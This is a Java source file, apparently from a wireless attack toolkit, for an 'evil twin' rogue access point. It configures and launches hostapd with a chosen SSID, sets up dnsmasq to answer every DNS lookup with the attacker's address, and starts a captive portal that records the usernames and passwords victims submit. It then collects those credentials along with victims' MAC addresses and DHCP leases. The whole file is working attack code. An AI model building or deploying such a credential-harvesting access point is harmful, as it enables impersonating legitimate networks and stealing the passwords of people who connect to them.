package ewave.active;

import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.nio.file.attribute.PosixFilePermissions;
import java.time.Instant;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Objects;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Pattern;

/** hostapd, dnsmasq, and a stdlib Python captive portal that records submitted credentials. */
public final class EvilTwin {
    private static final Pattern INTERFACE = Pattern.compile("[a-zA-Z0-9_][a-zA-Z0-9_.-]{0,14}");
    private static final Pattern MAC = Pattern.compile("(?i)(?:[0-9a-f]{2}:){5}[0-9a-f]{2}");
    private static final Pattern STA_CONNECTED = Pattern.compile(
            "(?i)\\bAP-STA-CONNECTED\\s+((?:[0-9a-f]{2}:){5}[0-9a-f]{2})\\b");
    private static final Pattern STA_DISCONNECTED = Pattern.compile(
            "(?i)\\bAP-STA-DISCONNECTED\\s+((?:[0-9a-f]{2}:){5}[0-9a-f]{2})\\b");
    private static final int OUTPUT_LIMIT = 1_048_576;
    private static final int CREDENTIAL_LIMIT = 200;

    @FunctionalInterface public interface ProcessStarter {
        Process start(ProcessBuilder builder) throws IOException;
    }

    public record Credential(String time, String client, String username, String password) {}
    public record ConnectedStation(String mac, String connectedAt) {}
    public record DhcpLease(String ip, String mac, String hostname, long expiresAtEpochSeconds) {}
    public record Status(boolean running, String stage, String ssid, String error, List<Credential> credentials,
                         String portalUrl, String workDir, String credentialsFile, String output,
                         List<ConnectedStation> connectedStations, List<DhcpLease> dhcpLeases,
                         long elapsedSeconds) {
        public Status {
            credentials = credentials == null ? List.of() : List.copyOf(credentials);
            connectedStations = connectedStations == null ? List.of() : List.copyOf(connectedStations);
            dhcpLeases = dhcpLeases == null ? List.of() : List.copyOf(dhcpLeases);
        }

        public Status(boolean running, String stage, String ssid, String error, List<Credential> credentials,
                      String portalUrl, String workDir, String credentialsFile, String output) {
            this(running, stage, ssid, error, credentials, portalUrl, workDir, credentialsFile, output,
                    List.of(), List.of(), 0L);
        }
    }

    private final String apInterface;
    private final String ssid;
    private final int channel;
    private final int portalPort;
    private final boolean configureAddress;
    private final Path workDir;
    private final Path credentialsFile;
    private final ProcessStarter starter;
    private final AtomicBoolean used = new AtomicBoolean();
    private final Set<Process> processes = new HashSet<>();
    private final ArrayDeque<Credential> credentials = new ArrayDeque<>();
    private final LinkedHashMap<String, ConnectedStation> connectedStations = new LinkedHashMap<>();
    private final StringBuilder output = new StringBuilder();
    private volatile Process hostapd;
    private volatile Process dnsmasq;
    private volatile Process portal;
    private volatile boolean running;
    private volatile boolean terminated;
    private boolean addressAssigned;
    private volatile long startedAtNanos;
    private volatile long stoppedElapsedSeconds;
    private volatile String stage = "Ready";
    private volatile String error;
    private volatile IOException readFailure;
    private boolean truncated;

    public EvilTwin(String apInterface, String ssid, int channel, int portalPort) {
        this(apInterface, ssid, channel, portalPort, false);
    }

    public EvilTwin(String apInterface, String ssid, int channel, int portalPort, boolean configureAddress) {
        this(apInterface, ssid, channel, portalPort, configureAddress,
                Path.of(System.getProperty("java.io.tmpdir"), "ewave-evil-twin-" + UUID.randomUUID()));
    }

    private EvilTwin(String apInterface, String ssid, int channel, int portalPort, boolean configureAddress,
                     Path directory) {
        this(apInterface, ssid, channel, portalPort, configureAddress, directory.toString(),
                directory.resolve("credentials.tsv").toString(), ProcessBuilder::start);
    }

    public EvilTwin(String apInterface, String ssid, int channel, int portalPort,
                    String workDir, String credentialsFile, ProcessStarter starter) {
        this(apInterface, ssid, channel, portalPort, false, workDir, credentialsFile, starter);
    }

    /** Process creation boundary and persistent paths for embedding and hardware-free tests. */
    public EvilTwin(String apInterface, String ssid, int channel, int portalPort, boolean configureAddress,
                    String workDir, String credentialsFile, ProcessStarter starter) {
        if (apInterface == null || !INTERFACE.matcher(apInterface).matches())
            throw new IllegalArgumentException("interface must be a Linux interface name (1–15 letters, digits, _, . or -)");
        if (ssid == null || ssid.isBlank() || ssid.getBytes(StandardCharsets.UTF_8).length > 32
                || ssid.indexOf('\n') >= 0 || ssid.indexOf('\r') >= 0)
            throw new IllegalArgumentException("ssid must be 1–32 UTF-8 bytes on one line");
        if (!(channel >= 1 && channel <= 14 || channel >= 32 && channel <= 144 && channel % 4 == 0
                || channel >= 149 && channel <= 177 && (channel - 149) % 4 == 0))
            throw new IllegalArgumentException("Evil twin supports 2.4/5 GHz channels only; 6 GHz AP configuration is unavailable");
        if (portalPort < 1 || portalPort > 65_535) throw new IllegalArgumentException("portalPort must be between 1 and 65535");
        this.apInterface = apInterface;
        this.ssid = ssid;
        this.channel = channel;
        this.portalPort = portalPort;
        this.configureAddress = configureAddress;
        this.workDir = Path.of(Objects.requireNonNull(workDir)).toAbsolutePath().normalize();
        this.credentialsFile = Path.of(Objects.requireNonNull(credentialsFile)).toAbsolutePath().normalize();
        this.starter = Objects.requireNonNull(starter);
    }

    public Status start() throws IOException {
        if (!used.compareAndSet(false, true)) throw new IllegalStateException("This evil twin has already been used");
        try {
            PrivateWorkspace.create(workDir);
            PrivateWorkspace.requireDirectory(credentialsFile.getParent());
            if (Files.exists(credentialsFile, java.nio.file.LinkOption.NOFOLLOW_LINKS)) {
                PrivateWorkspace.requireFile(credentialsFile);
                Files.delete(credentialsFile);
            }
            Files.createFile(credentialsFile,
                    PosixFilePermissions.asFileAttribute(PosixFilePermissions.fromString("rw-------")));
            writeResources();
            writeHostapdConfig();
            writeDnsmasqConfig();
            synchronized (this) {
                running = true;
                startedAtNanos = System.nanoTime();
                stoppedElapsedSeconds = 0L;
                error = null;
            }
            if (configureAddress) {
                stage = "Configuring " + apInterface + " (10.0.0.1/24)…";
                runSetupCommand(List.of("sudo", "ip", "link", "set", "dev", apInterface, "up"));
                runSetupCommand(List.of("sudo", "ip", "addr", "replace", "10.0.0.1/24", "dev", apInterface));
                synchronized (this) {
                    if (terminated) throw new IOException("Evil twin was stopped while starting");
                    addressAssigned = true;
                }
            }
            stage = "Starting hostapd…";
            hostapd = launch(List.of("sudo", "hostapd", workDir.resolve("hostapd.conf").toString()));
            watch(hostapd, "hostapd");
            stage = "Starting dnsmasq…";
            dnsmasq = launch(List.of("sudo", "dnsmasq", "-C", workDir.resolve("dnsmasq.conf").toString(), "-k"));
            watch(dnsmasq, "dnsmasq");
            stage = "Starting captive portal…";
            portal = launch(List.of("sudo", "python3", workDir.resolve("portal_server.py").toString(),
                    "--port", Integer.toString(portalPort),
                    "--creds", credentialsFile.toString()));
            watch(portal, "portal server");
            synchronized (this) {
                if (terminated) throw new IOException("Evil twin was stopped while starting");
                if (running) stage = "Portal active";
            }
            if (!running) {
                terminate();
                return status();
            }
            Thread.ofVirtual().name("ewave-portal-credentials").start(this::tailCredentials);
            return status();
        } catch (IOException | RuntimeException failure) {
            synchronized (this) {
                if (error == null) error = Objects.toString(failure.getMessage(), "Evil twin failed to start");
                stage = "Stopped";
            }
            terminate();
            throw failure;
        }
    }

    public Status status() {
        List<Credential> captured;
        List<ConnectedStation> stations;
        long elapsed;
        synchronized (this) {
            captured = List.copyOf(credentials);
            stations = List.copyOf(connectedStations.values());
            elapsed = startedAtNanos == 0L ? 0L
                    : running ? TimeUnit.NANOSECONDS.toSeconds(Math.max(0L, System.nanoTime() - startedAtNanos))
                    : stoppedElapsedSeconds;
        }
        boolean active = running && isRunning(hostapd) && isRunning(dnsmasq) && isRunning(portal);
        if (running && !active && error == null) error = "A helper process exited";
        return new Status(active, stage, ssid, error, captured, portalUrl(), workDir.toString(),
                credentialsFile.toString(), output(), stations, readDhcpLeases(), elapsed);
    }

    public void terminate() {
        boolean releaseAddress;
        synchronized (this) {
            if (startedAtNanos != 0L && running) {
                stoppedElapsedSeconds = TimeUnit.NANOSECONDS.toSeconds(Math.max(0L, System.nanoTime() - startedAtNanos));
            }
            terminated = true;
            running = false;
            stage = "Stopped";
            for (Process current : processes) forceStop(current);
            processes.clear();
            hostapd = null;
            dnsmasq = null;
            portal = null;
            releaseAddress = addressAssigned;
            addressAssigned = false;
        }
        if (releaseAddress) removeAssignedAddress();
    }

    private String portalUrl() {
        return "http://10.0.0.1" + (portalPort == 80 ? "" : ":" + portalPort) + "/";
    }

    private void writeResources() throws IOException {
        copyResource("/portal/portal_server.py", workDir.resolve("portal_server.py"));
    }

    private static void copyResource(String name, Path target) throws IOException {
        try (var input = EvilTwin.class.getResourceAsStream(name)) {
            if (input == null) throw new IOException("Bundled portal resource is missing: " + name);
            Files.copy(input, target, StandardCopyOption.REPLACE_EXISTING);
        }
    }

    private void writeHostapdConfig() throws IOException {
        String mode = channel == 14 ? "b" : channel < 14 ? "g" : "a";
        Path path = workDir.resolve("hostapd.conf");
        Files.writeString(path, String.join("\n",
                "interface=" + apInterface,
                "driver=nl80211",
                "ssid=" + ssid,
                "hw_mode=" + mode,
                "channel=" + channel,
                "auth_algs=1",
                "wmm_enabled=1",
                "ignore_broadcast_ssid=0",
                ""), StandardCharsets.UTF_8);
        setPermissions(path, "rw-------");
    }

    private void writeDnsmasqConfig() throws IOException {
        Path path = workDir.resolve("dnsmasq.conf");
        Files.writeString(path, String.join("\n",
                "interface=" + apInterface,
                "bind-interfaces",
                "except-interface=lo",
                "dhcp-leasefile=" + workDir.resolve("dnsmasq.leases"),
                "pid-file=" + workDir.resolve("dnsmasq.pid"),
                "dhcp-range=10.0.0.10,10.0.0.100,12h",
                "dhcp-option=3,10.0.0.1",
                "dhcp-option=6,10.0.0.1",
                "address=/#/10.0.0.1",
                "no-resolv",
                "no-hosts",
                "log-queries",
                "log-dhcp",
                ""), StandardCharsets.UTF_8);
        setPermissions(path, "rw-------");
    }

    private static void setPermissions(Path path, String mode) throws IOException {
        try {
            Files.setPosixFilePermissions(path, PosixFilePermissions.fromString(mode));
        } catch (UnsupportedOperationException ignored) { /* Non-POSIX filesystem. */ }
    }

    private Process launch(List<String> command) throws IOException {
        Process started = starter.start(new ProcessBuilder(command).redirectErrorStream(true));
        if (started == null) throw new IOException("The helper process did not start: " + command.getFirst());
        synchronized (this) {
            if (terminated || !running) {
                forceStop(started);
                throw new IOException("A helper process exited before the evil twin started");
            }
            processes.add(started);
        }
        started.getOutputStream().close();
        Thread.ofVirtual().name("ewave-evil-twin-output").start(() -> drain(started));
        return started;
    }

    private void watch(Process source, String name) {
        Thread.ofVirtual().name("ewave-evil-twin-watch").start(() -> {
            try {
                source.waitFor();
            } catch (InterruptedException interrupted) {
                Thread.currentThread().interrupt();
                return;
            }
            boolean unexpected;
            boolean releaseAddress = false;
            synchronized (this) {
                processes.remove(source);
                unexpected = running && !terminated;
                if (unexpected) {
                    if (startedAtNanos != 0L) {
                        stoppedElapsedSeconds = TimeUnit.NANOSECONDS.toSeconds(
                                Math.max(0L, System.nanoTime() - startedAtNanos));
                    }
                    error = name + " exited unexpectedly";
                    running = false;
                    stage = "Stopped";
                    releaseAddress = addressAssigned;
                    addressAssigned = false;
                }
            }
            if (unexpected) {
                for (Process current : new Process[]{hostapd, dnsmasq, portal})
                    if (current != null) forceStop(current);
                if (releaseAddress) removeAssignedAddress();
            }
        });
    }

    private void runSetupCommand(List<String> command) throws IOException {
        Process setup = starter.start(new ProcessBuilder(command).redirectErrorStream(true));
        if (setup == null) throw new IOException("Setup command did not start: " + String.join(" ", command));
        synchronized (this) {
            if (terminated || !running) {
                forceStop(setup);
                throw new IOException("Evil twin was stopped while configuring " + apInterface);
            }
            processes.add(setup);
        }
        setup.getOutputStream().close();
        var setupOutput = new HandshakeAnalyzer.Output(setup.getInputStream(), 65_536);
        try {
            if (!setup.waitFor(5, TimeUnit.SECONDS)) {
                throw new IOException("Interface setup timed out: " + String.join(" ", command));
            }
            setupOutput.finish();
            append(setupOutput.text());
            if (setup.exitValue() != 0) {
                throw new IOException("Interface setup failed (" + String.join(" ", command) + "): "
                        + setupOutput.text().strip());
            }
        } catch (InterruptedException interrupted) {
            Thread.currentThread().interrupt();
            throw new IOException("Interrupted while configuring " + apInterface, interrupted);
        } finally {
            forceStop(setup);
            setupOutput.close();
            synchronized (this) { processes.remove(setup); }
        }
    }

    private void removeAssignedAddress() {
        Process cleanup = null;
        try {
            cleanup = starter.start(new ProcessBuilder(
                    "sudo", "ip", "addr", "del", "10.0.0.1/24", "dev", apInterface)
                    .redirectErrorStream(true));
            if (cleanup == null) return;
            cleanup.getOutputStream().close();
            try (var input = cleanup.getInputStream()) {
                input.readNBytes(4096);
            } catch (IOException ignored) { }
            cleanup.waitFor(2, TimeUnit.SECONDS);
        } catch (IOException ignored) {
            // Best-effort cleanup of the lab IPv4 address.
        } catch (InterruptedException interrupted) {
            Thread.currentThread().interrupt();
        } finally {
            if (cleanup != null) forceStop(cleanup);
        }
    }

    private void drain(Process source) {
        var lineCarry = new StringBuilder();
        try (var input = new InputStreamReader(source.getInputStream(), StandardCharsets.UTF_8)) {
            char[] buffer = new char[4096];
            int size;
            while ((size = input.read(buffer)) != -1) {
                append(new String(buffer, 0, size));
                for (int i = 0; i < size; i++) {
                    char ch = buffer[i];
                    if (ch == '\n' || ch == '\r') {
                        if (!lineCarry.isEmpty()) {
                            observeStationLine(lineCarry.toString());
                            lineCarry.setLength(0);
                        }
                    } else if (lineCarry.length() < 4096) {
                        lineCarry.append(ch);
                    }
                }
            }
            if (!lineCarry.isEmpty()) observeStationLine(lineCarry.toString());
        } catch (IOException failure) {
            readFailure = failure;
        }
    }

    private void observeStationLine(String line) {
        var connected = STA_CONNECTED.matcher(line);
        if (connected.find()) {
            String mac = connected.group(1).toLowerCase(Locale.ROOT);
            synchronized (this) {
                connectedStations.put(mac, new ConnectedStation(mac, Instant.now().toString()));
            }
            return;
        }
        var disconnected = STA_DISCONNECTED.matcher(line);
        if (disconnected.find()) {
            String mac = disconnected.group(1).toLowerCase(Locale.ROOT);
            synchronized (this) {
                connectedStations.remove(mac);
            }
        }
    }

    private List<DhcpLease> readDhcpLeases() {
        Path leases = workDir.resolve("dnsmasq.leases");
        if (!Files.isRegularFile(leases, java.nio.file.LinkOption.NOFOLLOW_LINKS)) return List.of();
        try {
            var lines = Files.readAllLines(leases, StandardCharsets.UTF_8);
            var parsed = new ArrayList<DhcpLease>();
            for (String raw : lines) {
                String trimmed = raw.strip();
                if (trimmed.isEmpty()) continue;
                String[] parts = trimmed.split("\\s+");
                if (parts.length < 4) continue;
                try {
                    long expires = Long.parseLong(parts[0]);
                    String mac = parts[1].toLowerCase(Locale.ROOT);
                    String ip = parts[2];
                    String host = "*".equals(parts[3]) || parts[3].isBlank() ? null : parts[3];
                    if (MAC.matcher(mac).matches()) parsed.add(new DhcpLease(ip, mac, host, expires));
                } catch (NumberFormatException ignored) { }
            }
            return List.copyOf(parsed);
        } catch (IOException ignored) {
            return List.of();
        }
    }

    private void tailCredentials() {
        while (running && !terminated) {
            if (!Files.exists(credentialsFile)) {
                if (!sleep(200)) return;
                continue;
            }
            try (var reader = Files.newBufferedReader(credentialsFile, StandardCharsets.UTF_8)) {
                while (running && !terminated) {
                    String line = reader.readLine();
                    if (line != null) {
                        record(line);
                        continue;
                    }
                    if (!sleep(300)) return;
                }
            } catch (IOException failure) {
                synchronized (this) { error = "Could not read portal credentials: " + failure.getMessage(); }
                if (!sleep(500)) return;
            }
        }
    }

    private void record(String line) {
        var fields = line.split("\t", -1);
        if (fields.length != 4) return;
        synchronized (this) {
            if (credentials.size() == CREDENTIAL_LIMIT) credentials.removeFirst();
            credentials.addLast(new Credential(fields[0], fields[1], fields[2], fields[3]));
        }
    }

    private static boolean sleep(long millis) {
        try {
            Thread.sleep(millis);
            return true;
        } catch (InterruptedException interrupted) {
            Thread.currentThread().interrupt();
            return false;
        }
    }

    private synchronized void append(String value) {
        int remaining = Math.max(0, OUTPUT_LIMIT - output.length());
        if (remaining > 0) output.append(value, 0, Math.min(remaining, value.length()));
        if (value.length() > remaining && !truncated) {
            output.append("\n[Output truncated at 1 MiB]\n");
            truncated = true;
        }
    }

    /** Diagnostics for the Ops API while the portal is running. */
    public synchronized String output() {
        if (readFailure != null) return output + "\nCould not read process output: " + readFailure.getMessage() + "\n";
        return output.toString();
    }

    private static boolean isRunning(Process process) {
        return process != null && process.isAlive();
    }

    private static void forceStop(Process process) {
        try { process.descendants().toList().reversed().forEach(ProcessHandle::destroyForcibly); }
        catch (UnsupportedOperationException ignored) { /* Embedded Process may lack handles. */ }
        if (process.isAlive()) process.destroyForcibly();
    }
}
